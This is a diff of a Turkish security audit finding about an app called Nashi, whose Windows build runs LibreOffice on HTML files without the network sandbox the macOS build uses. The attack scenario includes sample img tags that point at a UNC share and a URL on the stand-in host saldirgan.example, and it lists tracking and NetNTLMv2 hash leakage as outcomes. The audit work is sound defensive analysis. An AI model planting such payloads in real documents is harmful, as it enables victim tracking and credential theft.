@@ -32,7 +32,7 @@ Bağlam: Kod salt okunarak incelendi. Hiçbir betik, build, test ya da uygulama 
 - `windows/Nashi.Core/OfficeDocuments.cs:28-35`: `soffice` doğrudan çalıştırılıyor; ağ kısıtı yok.
 - Karşılaştırma: macOS `Sources/NashiCore/DocumentEngine.swift:166-169` HTML'i her zaman `embedHTMLImages` ile sınırlıyor. `:180-186` da `sandbox-exec ... (deny network* (remote ip))` kullanıyor. Yorum açıkça "LibreOffice imports linked HTML resources" diyor.
 
-**Saldırı senaryosu:** Saldırgan kurbana `fatura.html` gönderir. İçinde `<img src="\\saldirgan.example\s\a.png">`, `<img src="http://saldirgan.example/p?id=kurban">` ya da `<img src="file:///C:/Users/kurban/Pictures/kimlik.png">` vardır. Kurban dosyayı Nashi'de PNG/JPG, Pages ya da sabit EPUB'a dönüştürür. LibreOffice bağlı kaynağı çözerse üç şey olur:
+**Saldırı senaryosu:** Saldırgan kurbana `fatura.html` gönderir. İçinde `<img src="\\saldirgan.example\s\a.png">`, `<img src="http://saldirgan.example/p?id=kurban">` ya da `<img src="file:///D:/Belgeler/kimlik.png">` vardır. Kurban dosyayı Nashi'de PNG/JPG, Pages ya da sabit EPUB'a dönüştürür. LibreOffice bağlı kaynağı çözerse üç şey olur:
 - Kurbanın IP adresi ve dönüştürme anı saldırgana gider (izleme).
 - Giden SMB/WebDAV açıksa UNC yolu üzerinden NetNTLMv2 hash'i sızar.
 - Yerel resimler çıktıya gömülür; kurban çıktıyı paylaşırsa bunlar da gider.
